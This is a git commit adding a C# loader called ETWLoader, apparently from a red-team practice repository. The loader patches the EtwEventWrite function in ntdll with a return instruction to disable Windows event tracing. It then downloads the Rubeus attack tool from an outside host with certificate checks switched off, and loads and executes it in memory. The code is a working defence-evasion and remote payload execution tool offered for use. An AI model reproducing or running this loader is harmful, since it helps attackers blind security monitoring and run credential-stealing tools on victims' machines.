fdd7ed23090b825c96428ccd6037783620f932d4
JesusCries <62108395+WesleyWong420@users.noreply.github.com>
2023-02-28 19:14:15 -0800

    Add files via upload

---
+++ Process Injection/ETWLoader/ETWLoader/Program.cs
@@ -0,0 +1,68 @@
+﻿using System;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Net.Http;
+using System.Threading.Tasks;
+
+namespace ETWLoader
+{
+    internal class Program
+    {
+        /*static void Main(string[] args)*/
+        static async Task Main(string[] args)   
+        {
+            // get location of ntdll.dll
+            var hModule = Win32.LoadLibrary("ntdll.dll");
+            Console.WriteLine("ndtll: 0x{0:X}", hModule.ToInt64());
+
+            // find EtwEventWrite
+            var hfunction = Win32.GetProcAddress(
+                hModule, 
+                "EtwEventWrite");
+            Console.WriteLine("EtwEventWrite: 0x{0:X}", hfunction.ToInt64());
+
+            var patch = new byte[] { 0xC3 };
+
+            // mark as RW
+            Win32.VirtualProtect(
+                hfunction, 
+                (UIntPtr)patch.Length, 
+                Win32.MemoryProtection.ReadWrite, 
+                out var oldProtect);
+            Console.WriteLine("Memory: 0x{0:X} -> 0x04", oldProtect);
+
+            // write a ret
+            Marshal.Copy(patch, 0, hfunction, patch.Length);
+
+            // restore memory
+            Win32.VirtualProtect(
+                hfunction, 
+                (UIntPtr)patch.Length, 
+                oldProtect, 
+                out _);
+            Console.WriteLine("Memory: 0x04 -> 0x{0:X}", oldProtect);
+
+            // pretend this is coming down a C2 as a byte[]
+            byte[] bytes;
+
+            using (var handler = new HttpClientHandler())
+            {
+                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;
+
+                using (var client = new HttpClient(handler))
+                {
+                    bytes = await client.GetByteArrayAsync("https://192.168.231.128:443/Rubeus.exe");
+                }
+            }
+
+            // pretend this is coming down a C2 as a byte[]
+            /*var bytes = File.ReadAllBytes(@"C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe");*/
+
+            // load the assembly
+            var assembly = Assembly.Load(bytes);
+
+            // invoke its entry point with arguments
+            assembly.EntryPoint.Invoke(null, new object[] { args });
+        }
+    }
+}
---
+++ Process Injection/ETWLoader/ETWLoader/Win32.cs
@@ -0,0 +1,55 @@
+﻿using System;
+using System.Net.NetworkInformation;
+using System.Runtime.InteropServices;
+
+namespace ETWLoader
+{
+    internal class Win32
+    {
+        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
+        public static extern IntPtr LoadLibrary(
+            string lpFileName);
+
+        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+        public static extern IntPtr GetProcAddress(
+            IntPtr hModule, 
+            string procName);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool VirtualProtect(
+            IntPtr lpAddress,
+            UIntPtr dwSize,
+            MemoryProtection flNewProtect,
+            out MemoryProtection lpflOldProtect);
+
+        [Flags]
+        public enum AllocationType
+        {
+            Commit = 0x1000,
+            Reserve = 0x2000,
+            Decommit = 0x4000,
+            Release = 0x8000,
+            Reset = 0x80000,
+            Physical = 0x400000,
+            TopDown = 0x100000,
+            WriteWatch = 0x200000,
+            LargePages = 0x20000000
+        }
+
+        [Flags]
+        public enum MemoryProtection
+        {
+            Execute = 0x10,
+            ExecuteRead = 0x20,
+            ExecuteReadWrite = 0x40,
+            ExecuteWriteCopy = 0x80,
+            NoAccess = 0x01,
+            ReadOnly = 0x02,
+            ReadWrite = 0x04,
+            WriteCopy = 0x08,
+            GuardModifierflag = 0x100,
+            NoCacheModifierflag = 0x200,
+            WriteCombineModifierflag = 0x400
+        }
+    }
+}
